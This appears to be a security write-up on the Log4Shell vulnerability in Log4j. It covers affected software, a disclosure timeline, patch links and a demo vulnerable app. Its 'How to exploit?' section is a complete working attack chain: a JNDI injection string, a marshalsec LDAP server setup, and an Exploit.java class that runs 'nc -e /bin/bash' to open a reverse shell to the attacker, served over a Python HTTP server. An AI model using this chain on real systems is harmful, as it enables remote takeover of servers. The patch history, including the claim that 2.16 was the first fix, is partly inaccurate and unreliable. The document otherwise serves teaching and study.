# CVE-2021-44228 - Log4j Remote Code Execution

CVE-2021-44228, known also as **Log4Shell**, is a severe vulnerability that exploits the popular **java** package **Log4j** that is used to log information when running an application. Applications that are using this package are:

- Minecraft and Minecraft Servers
- Steam
- Ghidra
- Baidu
- Apple iCloud

Here is the [attack surface](https://github.com/YfryTchsGD/Log4jAttackSurface) list of the exploit.

## How to exploit?

First, we need to find an attack entry point, this could be header information, query parameters or even POST data. After that, we can check if we get any response by:
1. Creating a listener (`nc -lvnp 9999` for example)
2. Sending this string through any of the potential entry points: `${jndi:ldap://<IP_ADDR>:9999/}`.
3. Checking if we get a connection.

If we get a connection, that means that the application is vulnerable and potentially we could get RCE.

To get the RCE, we have to have an LDAP server, a HTTP server and a listener. For the LDAP server, we can use [marshalsec](https://github.com/mbechler/marshalsec). We can set it up by:
- Building it using maven.
- Using the following command: `java -cp target/marshalsec-[VERSION]-SHAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "<HTTP_ATTACK_SERVER_ADDRESS>/#<class_file>"`

The next thing we need to do is to create a java exploit file that we can call `Exploit.java`, we can use this snippet:
```java
public class Exploit {
    static {
        try {
                java.lang.Runtime.getRuntime().exec("nc -e /bin/bash <NC_IP> <NC_PORT>");
        } catch(Exception e) {}
    }
}
```

**REMEMBER** that in java, the filename **must** have the same name as the class. Then we just need to build it using `javac <class>.java -source 8 -target 8`.

The next step is to create a http server, we can do that using `python3 -m http.server` (run in same directory as the exploit file).

The last step is to create a socket listener, we do that via `nc -lvnp <NC_PORT>`.

Send the following request to the vulnerable entry point `${jndi:ldap://<ADDRESS>:1389/<class>}` and we should get a **reverse shell**.


## So, what is all of this? (FIXME)

The main culprit of this severe vulnerability are what are called **Lookups** in Log4j2. Here is the [documentation.](https://logging.apache.org/log4j/2.x/manual/lookups.html)

## Timeline and people involved

### Discovery
The first discovery of this vulnerability was by Chen Zhaojun, a security engineer in the Alibaba Cloud Security Team on 24th November 2021.

### Disclosure
The disclosure was available to the public on 9th of December 2021, by a twitter user [p0rz9](https://web.archive.org/web/20211209230040/https://twitter.com/P0rZ9/status/1468949890571337731).

### Patch Date
The first patch to be done by Apache is on 6th of December 2021.

### First version vulnerable
The first version of the vulnerable package is `2.1` - created 19th October 2014.

## Patches
The first patch for CVE-44228 was released for version `2.16`.

### LOG4J2-3208 - Disable JNDI by default
Patch in version 2.16
- [Github commit with changes](https://github.com/apache/logging-log4j2/commit/c362aff473e9812798ff8f25f30a2619996605d5)
- [Jira issue](https://issues.apache.org/jira/browse/LOG4J2-3208)

## LOG4J2-3211 - Remove support for Lookups in messages
Patch in version 2.16
- [Github commit with changes](https://github.com/apache/logging-log4j2/pull/623/commits/9336696fe6b2770c504bbb9a6d809dddc6ab289c)
- [Jira issue](https://issues.apache.org/jira/browse/LOG4J2-3211)

## Vulnerable applications
I have created a simple java application which uses a vulnerable version of log4j2. I encourage you to try it out and even debug the application to see Log4Shell in action!

Here is a [github](https://github.com/Artideusz/Log4Shell_App) link and a [docker hub](https://hub.docker.com/repository/docker/artideusz/vulnerables_log4shell_java_app) link.